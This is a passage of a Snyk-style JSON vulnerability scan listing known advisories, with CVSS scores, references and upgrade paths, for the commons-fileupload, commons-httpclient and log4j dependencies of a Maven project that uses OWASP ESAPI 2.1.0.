      "identifiers": {
        "CVE": [
          "CVE-2014-0050"
        ],
        "CWE": [
          "CWE-264"
        ]
      },
      "packageName": "commons-fileupload:commons-fileupload",
      "proprietary": false,
      "creationTime": "2016-12-25T16:51:51Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2014-02-11T16:51:51Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "commons-fileupload",
        "artifactId": "commons-fileupload"
      },
      "publicationTime": "2014-02-11T16:51:51Z",
      "modificationTime": "2023-02-09T11:24:59.734247Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "commons-fileupload:commons-fileupload@1.2"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.1.0.1",
        "commons-fileupload:commons-fileupload@1.3.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-fileupload:commons-fileupload",
      "version": "1.2"
    },
    {
      "id": "SNYK-JAVA-COMMONSFILEUPLOAD-30401",
      "title": "Arbitrary Code Execution",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[1.1,1.3.3)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "1.3.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "critical",
      "cvssScore": 9.8,
      "functions": [
        {
          "version": [
            "[1.1,1.3.3)"
          ],
          "functionId": {
            "filePath": "org/apache/commons/fileupload/disk/DiskFileItem.java",
            "className": "DiskFileItem",
            "functionName": "readObject"
          }
        }
      ],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "commons-fileupload:commons-fileupload",
      "references": [
        {
          "url": "https://github.com/apache/commons-fileupload/blob/master/src/changes/changes.xml%23L65",
          "title": "Github ChangeLog"
        },
        {
          "url": "https://github.com/apache/commons-fileupload/commit/388e824518697c2c8f9f83fd964621d9c2f8fc4c",
          "title": "GitHub Commit"
        },
        {
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-1000031",
          "title": "NVD"
        },
        {
          "url": "http://www.tenable.com/security/research/tra-2016-12",
          "title": "Tenable Security"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "critical",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.8,
          "modificationTime": "2022-07-26T01:11:38.227729Z"
        },
        {
          "assigner": "SUSE",
          "severity": "critical",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.8,
          "modificationTime": "2022-05-04T00:43:11.123709Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
          "cvssV3BaseScore": 7.3,
          "modificationTime": "2022-10-26T19:44:19.103303Z"
        }
      ],
      "description": "## Overview\n[`commons-fileupload:commons-fileupload`](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22commons-fileupload%22)\nThe Apache Commons FileUpload library contains a Java Object that, upon deserialization, can be manipulated to write or copy files in arbitrary locations. If integrated with [`ysoserial`](https://github.com/frohoff/ysoserial), it is possible to upload and execute binaries in a single deserialization call.\n\n# Details\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n- Apache Blog\n\n## Remediation\nUpgrade `commons-fileupload` to version 1.3.3 or higher.\n\n\n## References\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-1000031)\n- [Tenable Security](http://www.tenable.com/security/research/tra-2016-12)\n- [Github ChangeLog](https://github.com/apache/commons-fileupload/blob/master/src/changes/changes.xml#L65)\n- [Github Commit](https://github.com/apache/commons-fileupload/commit/388e824518697c2c8f9f83fd964621d9c2f8fc4c)\n",
      "epssDetails": {
        "percentile": "0.91021",
        "probability": "0.04227",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2016-1000031"
        ],
        "CWE": [
          "CWE-284"
        ]
      },
      "packageName": "commons-fileupload:commons-fileupload",
      "proprietary": false,
      "creationTime": "2017-02-22T07:28:18.753000Z",
      "functions_new": [
        {
          "version": [
            "[1.1,1.3.3)"
          ],
          "functionId": {
            "className": "org.apache.commons.fileupload.disk.DiskFileItem",
            "functionName": "readObject"
          }
        }
      ],
      "alternativeIds": [],
      "disclosureTime": "2016-10-25T14:29:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "commons-fileupload",
        "artifactId": "commons-fileupload"
      },
      "publicationTime": "2016-10-26T03:04:11.895000Z",
      "modificationTime": "2022-10-26T19:44:19.103303Z",
      "socialTrendAlert": false,
      "severityWithCritical": "critical",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "commons-fileupload:commons-fileupload@1.2"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.0.0",
        "commons-fileupload:commons-fileupload@1.3.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-fileupload:commons-fileupload",
      "version": "1.2"
    },
    {
      "id": "SNYK-JAVA-COMMONSFILEUPLOAD-31540",
      "title": "Information Exposure",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[,1.3.2)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "1.3.2"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 6.5,
      "functions": [
        {
          "version": [
            "[1.2.0 ,1.3.2)"
          ],
          "functionId": {
            "filePath": "org/apache/commons/fileupload/FileUploadBase$FileItemIteratorImpl.java",
            "className": "FileUploadBase$FileItemIteratorImpl",
            "functionName": "<init>"
          }
        },
        {
          "version": [
            "[1.0-rc1,1.2.0)"
          ],
          "functionId": {
            "filePath": "org/apache/commons/fileupload/FileUploadBase.java",
            "className": "FileUploadBase",
            "functionName": "parseRequest"
          }
        },
        {
          "version": [
            "[,1.0-rc1)"
          ],
          "functionId": {
            "filePath": "org/apache/commons/fileupload/FileUpload.java",
            "className": "FileUpload",
            "functionName": "parseRequest"
          }
        }
      ],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "commons-fileupload:commons-fileupload",
      "references": [
        {
          "url": "https://github.com/apache/commons-fileupload/blob/master/src/changes/changes.xml%23L56",
          "title": "Github ChangeLog"
        },
        {
          "url": "https://github.com/apache/commons-fileupload/commit/5b4881d7f75f439326f54fa554a9ca7de6d60814",
          "title": "GitHub Commit"
        }
      ],
      "cvssDetails": [],
      "description": "## Overview\r\n[`commons-fileupload:commons-fileupload`](https://commons.apache.org/proper/commons-fileupload/) provides a simple yet flexible means of adding support for multipart file upload functionality to servlets and web applications.\r\n\r\nAffected versions of the package are vulnerable to Information Disclosure because the `InputStream` is not closed on exception.\r\n\r\n## Remediation\r\nUpgrade `commons-fileupload` to version 1.3.2 or higher.\r\n\r\n## References\r\n- [Github ChangeLog](https://github.com/apache/commons-fileupload/blob/master/src/changes/changes.xml#L56)\r\n- [Github Commit](https://github.com/apache/commons-fileupload/commit/5b4881d7f75f439326f54fa554a9ca7de6d60814)",
      "epssDetails": null,
      "identifiers": {
        "CVE": [],
        "CWE": [
          "CWE-200"
        ]
      },
      "packageName": "commons-fileupload:commons-fileupload",
      "proprietary": false,
      "creationTime": "2017-10-01T08:05:48.497000Z",
      "functions_new": [
        {
          "version": [
            "[1.2.0 ,1.3.2)"
          ],
          "functionId": {
            "className": "org.apache.commons.fileupload.FileUploadBase$FileItemIteratorImpl",
            "functionName": "<init>"
          }
        },
        {
          "version": [
            "[1.0-rc1,1.2.0)"
          ],
          "functionId": {
            "className": "org.apache.commons.fileupload.FileUploadBase",
            "functionName": "parseRequest"
          }
        },
        {
          "version": [
            "[,1.0-rc1)"
          ],
          "functionId": {
            "className": "org.apache.commons.fileupload.FileUpload",
            "functionName": "parseRequest"
          }
        }
      ],
      "alternativeIds": [],
      "disclosureTime": "2014-02-17T22:00:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "commons-fileupload",
        "artifactId": "commons-fileupload"
      },
      "publicationTime": "2017-02-17T08:05:48Z",
      "modificationTime": "2020-12-14T14:41:37.686165Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "commons-fileupload:commons-fileupload@1.2"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.0.0",
        "commons-fileupload:commons-fileupload@1.3.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-fileupload:commons-fileupload",
      "version": "1.2"
    },
    {
      "id": "SNYK-JAVA-COMMONSFILEUPLOAD-3326457",
      "title": "Denial of Service (DoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
      "credit": [
        "Jakob Ackermann"
      ],
      "semver": {
        "vulnerable": [
          "[1.0-beta-1, 1.5)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "1.5"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 6.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "commons-fileupload:commons-fileupload",
      "references": [
        {
          "url": "https://lists.apache.org/thread/4xl4l09mhwg4vgsk7dxqogcjrobrrdoy",
          "title": "Apache Mailing List"
        },
        {
          "url": "https://github.com/apache/commons-fileupload/commit/0a306f75949f2e9f5f92c400cad39d20117a2eb0",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/apache/commons-fileupload/commit/e20c04990f7420ca917e96a84cec58b13a1b3d17",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/apache/tomcat/commit/063e2e81ede50c287f737cc8e2915ce7217e886e",
          "title": "GitHub Commit (Tomcat)"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 6.5,
          "modificationTime": "2023-02-28T14:13:08.790066Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-03-02T01:10:12.884606Z"
        },
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-03-11T11:02:24.927537Z"
        }
      ],
      "description": "## Overview\n[commons-fileupload:commons-fileupload](https://mvnrepository.com/artifact/commons-fileupload/commons-fileupload) is a component that provides a simple yet flexible means of adding support for multipart file upload functionality to servlets and web applications.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when an attacker sends a large number of request parts in a series of uploads or a single multipart upload.\r\n\r\n**NOTE:** After upgrading to the fixed version, the `setFileCountMax()` must be explicitly set to avoid this vulnerability.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `commons-fileupload:commons-fileupload` to version 1.5 or higher.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/4xl4l09mhwg4vgsk7dxqogcjrobrrdoy)\n- [GitHub Commit](https://github.com/apache/commons-fileupload/commit/0a306f75949f2e9f5f92c400cad39d20117a2eb0)\n- [GitHub Commit](https://github.com/apache/commons-fileupload/commit/e20c04990f7420ca917e96a84cec58b13a1b3d17)\n- [GitHub Commit (Tomcat)](https://github.com/apache/tomcat/commit/063e2e81ede50c287f737cc8e2915ce7217e886e)\n",
      "epssDetails": {
        "percentile": "0.70204",
        "probability": "0.00408",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-24998"
        ],
        "CWE": [
          "CWE-400"
        ]
      },
      "packageName": "commons-fileupload:commons-fileupload",
      "proprietary": false,
      "creationTime": "2023-02-21T08:19:49.294883Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-02-21T08:00:22Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "commons-fileupload",
        "artifactId": "commons-fileupload"
      },
      "publicationTime": "2023-02-21T09:23:34.093821Z",
      "modificationTime": "2023-03-11T11:02:24.927537Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "commons-fileupload:commons-fileupload@1.2"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.5.2.0",
        "commons-fileupload:commons-fileupload@1.5"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-fileupload:commons-fileupload",
      "version": "1.2"
    },
    {
      "id": "SNYK-JAVA-COMMONSHTTPCLIENT-30083",
      "title": "Improper Certificate Validation",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[,3.1-jenkins-3)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "3.1-jenkins-3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [
        {
          "version": [
            "[2.0, 3.1)"
          ],
          "functionId": {
            "filePath": "org/apache/commons/httpclient/protocol/SSLProtocolSocketFactory.java",
            "className": "SSLProtocolSocketFactory",
            "functionName": "createSocket"
          }
        }
      ],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "commons-httpclient:commons-httpclient",
      "references": [
        {
          "url": "https://github.com/jenkinsci/lib-commons-httpclient/commit/a4427f1a6e57ff5250d5b9699948f4ccbb0efef1",
          "title": "GitHub Commit"
        },
        {
          "url": "https://issues.apache.org/jira/browse/HTTPCLIENT-1265",
          "title": "Jira Issue"
        },
        {
          "url": "http://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf",
          "title": "The University of Texas"
        },
        {
          "url": "https://exchange.xforce.ibmcloud.com/vulnerabilities/79984",
          "title": "X-force Vulnerability Report"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
          "cvssV3BaseScore": 5.4,
          "modificationTime": "2023-02-09T11:24:12.775159Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "low",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 3.7,
          "modificationTime": "2022-09-01T17:13:01.019923Z"
        }
      ],
      "description": "## Overview\n[commons-httpclient:commons-httpclient](https://mvnrepository.com/artifact/commons-httpclient/commons-httpclient) is a HttpClient component of the Apache HttpComponents project.\n\nAffected versions of this package are vulnerable to Improper Certificate Validation due to not verifying that the requesting server hostname matches a domain name in the subject's `Common Name (CN)` or `subjectAltName` field of the X.509 certificate. This allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate.\r\n\r\n**NOTE:** This plugin has been deprecated, but a fix has been released in version 3.1-jenkins-3 on a special Jenkins fork of the project.\n## Remediation\nUpgrade `commons-httpclient:commons-httpclient` to version 3.1-jenkins-3 or higher.\n## References\n- [GitHub Commit](https://github.com/jenkinsci/lib-commons-httpclient/commit/a4427f1a6e57ff5250d5b9699948f4ccbb0efef1)\n- [Jira Issue](https://issues.apache.org/jira/browse/HTTPCLIENT-1265)\n- [The University of Texas](http://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf)\n- [X-force Vulnerability Report](https://exchange.xforce.ibmcloud.com/vulnerabilities/79984)\n",
      "epssDetails": {
        "percentile": "0.60643",
        "probability": "0.00238",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2012-5783"
        ],
        "CWE": [
          "CWE-295"
        ]
      },
      "packageName": "commons-httpclient:commons-httpclient",
      "proprietary": false,
      "creationTime": "2016-12-25T16:51:47Z",
      "functions_new": [
        {
          "version": [
            "[2.0, 3.1)"
          ],
          "functionId": {
            "className": "org.apache.commons.httpclient.protocol.SSLProtocolSocketFactory",
            "functionName": "createSocket"
          }
        }
      ],
      "alternativeIds": [],
      "disclosureTime": "2012-11-04T22:55:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "commons-httpclient",
        "artifactId": "commons-httpclient"
      },
      "publicationTime": "2013-03-25T16:51:47Z",
      "modificationTime": "2023-02-09T11:24:12.775159Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "org.owasp.antisamy:antisamy@1.4.3",
        "commons-httpclient:commons-httpclient@3.1"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.0.0",
        "org.owasp.antisamy:antisamy@1.5.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-httpclient:commons-httpclient",
      "version": "3.1"
    },
    {
      "id": "SNYK-JAVA-COMMONSHTTPCLIENT-31660",
      "title": "Man-in-the-Middle (MitM)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 4.3,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "commons-httpclient:commons-httpclient",
      "references": [
        {
          "url": "https://github.com/apache/httpcomponents-client/commit/6e14fc146a66e0f3eb362f45f95d1a58ee18886a",
          "title": "GitHub Commit"
        },
        {
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-6153",
          "title": "NVD"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 4.3,
          "modificationTime": "2023-02-09T11:24:12.416149Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
          "cvssV3BaseScore": 5.4,
          "modificationTime": "2023-02-09T11:24:57.645898Z"
        }
      ],
      "description": "## Overview\n[commons-httpclient:commons-httpclient](https://mvnrepository.com/artifact/commons-httpclient/commons-httpclient) is a HttpClient component of the Apache HttpComponents project.\n\nAffected versions of this package are vulnerable to Man-in-the-Middle (MitM) due to not verifing the requesting server's hostname agains existing domain names in the SSL Certificate. The `AbstractVerifier` does not properly verify that the server hostname matches a domain name in the subject's `Common Name (CN)` or `subjectAltName` field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via a certificate with a subject that specifies a common name in a field that is not the CN field.  \r\n\r\n**NOTE:** this issue exists because of an incomplete fix for [CVE-2012-5783](SNYK-JAVA-COMMONSHTTPCLIENT-30083).\n## Remediation\nThere is no fixed version for `commons-httpclient:commons-httpclient`.\n## References\n- [GitHub Commit](https://github.com/apache/httpcomponents-client/commit/6e14fc146a66e0f3eb362f45f95d1a58ee18886a)\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-6153)\n",
      "epssDetails": {
        "percentile": "0.50674",
        "probability": "0.00154",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2012-6153"
        ],
        "CWE": [
          "CWE-20"
        ]
      },
      "packageName": "commons-httpclient:commons-httpclient",
      "proprietary": false,
      "creationTime": "2017-02-22T07:28:21.771000Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2014-09-04T17:55:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "commons-httpclient",
        "artifactId": "commons-httpclient"
      },
      "publicationTime": "2018-04-08T12:56:14Z",
      "modificationTime": "2023-02-09T11:24:57.645898Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "org.owasp.antisamy:antisamy@1.4.3",
        "commons-httpclient:commons-httpclient@3.1"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.0.0",
        "org.owasp.antisamy:antisamy@1.5.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-httpclient:commons-httpclient",
      "version": "3.1"
    },
    {
      "id": "SNYK-JAVA-LOG4J-1300176",
      "title": "Man-in-the-Middle (MitM)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "low",
      "cvssScore": 3.7,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "log4j:log4j",
      "references": [
        {
          "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
          "title": "Atlassian Patch"
        },
        {
          "url": "https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b",
          "title": "GitHub Commit"
        },
        {
          "url": "https://issues.apache.org/jira/browse/LOG4J2-2819",
          "title": "Jira Issue"
        },
        {
          "url": "https://github.com/qos-ch/reload4j/commit/90bc7826c206c256ee9ec6b51318cc1865cc19e9",
          "title": "Reload4j Fix Commit"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "low",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
          "cvssV3BaseScore": 3.7,
          "modificationTime": "2022-05-13T01:10:59.793871Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "low",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
          "cvssV3BaseScore": 3.7,
          "modificationTime": "2022-10-25T22:25:05.921273Z"
        }
      ],
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Man-in-the-Middle (MitM). Improper validation of certificate with host mismatch in Apache Log4j SMTP appender. This could allow an SMTPS connection to be intercepted by a man-in-the-middle attack which could leak any log messages sent through that appender.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [GitHub Commit](https://github.com/apache/logging-log4j2/commit/6851b5083ef9610bae320bf07e1f24d2aa08851b)\n- [Jira Issue](https://issues.apache.org/jira/browse/LOG4J2-2819)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/90bc7826c206c256ee9ec6b51318cc1865cc19e9)\n",
      "epssDetails": {
        "percentile": "0.60788",
        "probability": "0.00231",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-9488"
        ],
        "CWE": [
          "CWE-297"
        ],
        "GHSA": [
          "GHSA-vwqq-5vrc-xw9h"
        ]
      },
      "packageName": "log4j:log4j",
      "proprietary": false,
      "creationTime": "2021-06-04T15:38:41.700520Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-04-27T17:16:14Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "publicationTime": "2020-04-28T17:16:14Z",
      "modificationTime": "2023-09-28T10:28:56.484981Z",
      "socialTrendAlert": false,
      "severityWithCritical": "low",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "log4j:log4j@1.2.16"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.5.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.16"
    },
    {
      "id": "SNYK-JAVA-LOG4J-2316893",
      "title": "Arbitrary Code Execution",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 6.6,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "log4j:log4j",
      "references": [
        {
          "url": "https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx",
          "title": "Apache Mail"
        },
        {
          "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
          "title": "Atlassian Patch"
        },
        {
          "url": "https://github.com/apache/logging-log4j2/pull/608%23issuecomment-991723301",
          "title": "GitHub Comment"
        },
        {
          "url": "https://github.com/apache/logging-log4j2/pull/608",
          "title": "GitHub Discussion"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 6.4,
          "modificationTime": "2022-05-03T21:14:50.879880Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-11-27T21:15:02.884557Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-10-06T01:10:27.666341Z"
        }
      ],
